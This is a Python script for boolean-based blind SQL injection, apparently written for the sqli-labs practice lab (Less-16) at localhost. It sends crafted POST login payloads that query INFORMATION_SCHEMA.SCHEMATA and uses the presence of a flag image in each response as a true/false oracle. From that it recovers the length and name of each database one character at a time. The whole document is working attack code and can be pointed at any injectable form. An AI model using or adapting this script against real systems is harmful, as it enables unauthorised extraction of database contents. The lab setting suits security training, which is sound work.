import requests
import string

def get_length_dbs(url, data, comment):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    for i in range(20,4,-1):
        r = requests.post(url,data = data + str(i) + comment,headers=headers).text
        # print(url + str(i) + comment)
        if 'images/flag.jpg' in r:
            return i

def send(url,data):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    r = requests.post(url,data=data,headers=headers).text
    if 'images/flag.jpg' in r:
        return True
    else:
        return False

# alphabet = 'Ee3Tt7Aa@4Oo0Ii1!_NnSs5$HhRrDdLlCcUuMmWwFfGg6YyPpBbVvKkJjXxQqZz289{}"#%&\'()*+,-./:;<=>?[\\]^`|~ '
alphabet = string.ascii_lowercase + '_'
url = "http://localhost/Less-16/"
data = 'passwd=1&submit=Submit&uname=") or  '
#payload = "left((select database()),"
payload_length_1 = "length((select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit " 
payload_length_2 = ",1))="
payload1 = "left((select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit " 
payload2 = ",1)," 
payload3 = ")='"
comment = '--+' 
count = 1
dbs = ""

for i in range(0,5):
    length = get_length_dbs(url, data + payload_length_1 + str(i) + payload_length_2,comment)
    for j in range(length):
        for c in alphabet:
            final_url = data + payload1 + str(i) + payload2 + str(count) + payload3 + (dbs+c) + "'" + comment
            # print(final_url)
            if send(url, final_url):
                count += 1
                dbs += c
                # print(dbs)
    print("[+] Found: Database {}. {}".format(i+1,dbs))
    dbs = ""
    count = 1
